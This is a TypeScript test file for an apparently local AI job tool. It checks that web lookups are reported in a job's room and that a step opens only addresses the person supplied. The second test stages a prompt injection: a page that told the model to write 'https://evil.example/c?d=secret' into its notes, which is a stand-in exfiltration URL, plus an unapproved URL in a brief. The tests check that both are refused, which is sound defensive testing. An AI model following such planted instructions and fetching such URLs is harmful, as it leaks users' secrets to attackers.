// Web on for a job (its Overview's switch): what a step's model searched for and read is kept with the step's result
// and said in the job's room, in the same words as under a chat answer.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { roomLines, type JobEvent } from '../src/home.ts';
import type { Job, Step } from '../src/jobs.ts';
import { webWords } from '../src/webtools.ts';

const step = (title: string, role: string): Step => ({ title, role, files: ['notes.md'], brief: title, check: '', status: 'todo', summary: '', wrote: [] });
const job: Job = { id: '20261024-0100-abcd', goal: 'a page on local AI for a 16 GB card', created: '2026-10-24T01:00:00Z', updated: '', notes: '', steps: [step('Write the page', 'writer')], web: true };

test('what a step looked up on the web is said in the job\'s room with its result', () => {
  const words = webWords([
    { name: 'web_search', input: 'best MoE model 16 GB card', ok: true, said: '8 results' },
    { name: 'open_page', input: 'https://example.com/moe', ok: true, said: 'MoE on small cards, 1,204 words' },
    { name: 'open_page', input: 'https://evil.example/x', ok: false, said: 'not opened: not an address given in this chat' },
  ]);
  assert.equal(words, 'searched “best MoE model 16 GB card” (8 results); read MoE on small cards, 1,204 words; did not read https://evil.example/x (not opened: not an address given in this chat)');
  const at = '2026-10-24T01:05:00Z';
  const events: JobEvent[] = [{ at, type: 'result', n: 0, role: 'writer', files: ['notes.md'], flags: 0, worker: 'Qwen3.5-9B on this PC', tries: 1, notes: [], web: words }];
  const line = roomLines(events, job, [{ id: 'jen', name: 'Jen', role: 'writer' }]).find(l => l.text.startsWith('Finished step 1'));
  assert.ok(line);
  assert.match(line.text, / · Web: searched “best MoE model 16 GB card” \(8 results\); read MoE on small cards/);
  // A step with Web off says nothing about it.
  const quiet = roomLines([{ ...events[0], web: undefined } as JobEvent], job, []).find(l => l.text.startsWith('Finished step 1'));
  assert.ok(quiet && !/Web:/.test(quiet.text));
});

test('a step may open only addresses the person gave (the goal, their notes): not ones a model wrote into the notes or a brief', async () => {
  const { webSeedOf } = await import('../src/jobs.ts');
  const { WebTurn, Pacer } = await import('../src/webtools.ts');
  // Step 1 read a page that told the model to put an address in its summary; the planner's brief names one too.
  const planted: Job = { ...job, goal: 'compare the cards on https://cards.example/list', notes: 'Step 1 (Look up cards): see https://evil.example/c?d=secret', steps: [{ ...step('Write the page', 'writer'), brief: 'Also read https://brief.example/x' }] };
  const seed = webSeedOf(planted, ['My note: https://mine.example/notes']);
  const t = new WebTurn(seed, { search: { provider: 'duckduckgo' }, perCall: 4000, total: 8000, pace: new Pacer({ page: 0, jitter: 0, search: 0 }), get: async url => ({ status: 200, type: 'text/plain', body: Buffer.from('ok'), url }) });
  const never = new AbortController().signal;
  assert.match(await t.run('open_page', '{"url":"https://evil.example/c?d=secret"}', never), /^Not opened: that address was not given in this chat/);
  assert.match(await t.run('open_page', '{"url":"https://brief.example/x"}', never), /^Not opened/);
  assert.match(await t.run('open_page', '{"url":"https://cards.example/list"}', never), /ok/);
  assert.match(await t.run('open_page', '{"url":"https://mine.example/notes"}', never), /ok/);
});
